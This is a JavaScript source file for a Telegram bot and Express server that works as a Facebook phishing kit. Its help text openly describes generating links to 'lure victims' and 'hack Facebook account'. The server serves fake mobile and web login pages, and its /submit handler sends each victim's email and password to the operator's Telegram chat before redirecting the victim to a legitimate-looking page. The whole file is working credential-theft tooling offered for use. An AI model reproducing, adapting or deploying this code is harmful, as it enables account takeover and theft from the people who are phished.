const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const { botToken, hostURL } = require('./config');
const bot = new TelegramBot(botToken, { polling: true });

let userChatId = null;
let userRedirectUrl = null;
let isWaitingForURL = false;

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  userChatId = chatId; // Store the chatId for later use
  const welcomeMessage = 'Welcome to the login bot! \n\nHere are some options:\n/create - Generate the login URL\n/help - Get assistance or information';
  bot.sendMessage(chatId, welcomeMessage);
});

bot.onText(/\/create/, (msg) => {
  if (userChatId) {
    isWaitingForURL = true;
    bot.sendMessage(msg.chat.id, '🌐 Enter Your URL');
  } else {
    bot.sendMessage(msg.chat.id, 'Please send /start first to start the bot properly.');
  }
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (isWaitingForURL && userChatId) {
    if (messageText.startsWith('https://')) {
      userRedirectUrl = messageText;
    }

    const uniqueURLMobile = `${hostURL}/mobile/${userChatId}`;
    const uniqueURLWeb = `${hostURL}/web/${userChatId}`;
    const replyMessage = `<b>Mobile login URL:</b> <a href="${uniqueURLMobile}" target="_blank" style="color: blue; text-decoration: underline;">${uniqueURLMobile}</a>\n<b>Web login URL:</b> <a href="${uniqueURLWeb}" target="_blank" style="color: green; font-weight: bold;">${uniqueURLWeb}</a>`;

    // Send the reply message with or without the redirect URL
    bot.sendMessage(userChatId, replyMessage, { parse_mode: 'HTML' });

    // Reset the waiting state
    isWaitingForURL = false;
  }
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Through this bot you can hack facebok account just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to hack Facebook account.\n\nThe project is OSS at: https://github.com/TheBwof/fbtelephish ');
});

app.get('/mobile/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
});

app.get('/web/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  res.sendFile(path.join(__dirname, 'public', 'web.html'));
});

app.post('/submit', (req, res) => {
  const { email, pass } = req.body;
   if (userChatId) {
    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}\n<b>Safeguard your login details for account security.</b>`;
    bot.sendMessage(userChatId, message, { parse_mode: 'HTML' });
    // Redirect to stored URL after sending data to the bot
    res.redirect(userRedirectUrl || 'https://www.facebook.com/login/identify'); // Use stored URL or default URL
  } else {
    res.status(400).send('Incorrect Submitted Data.');
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
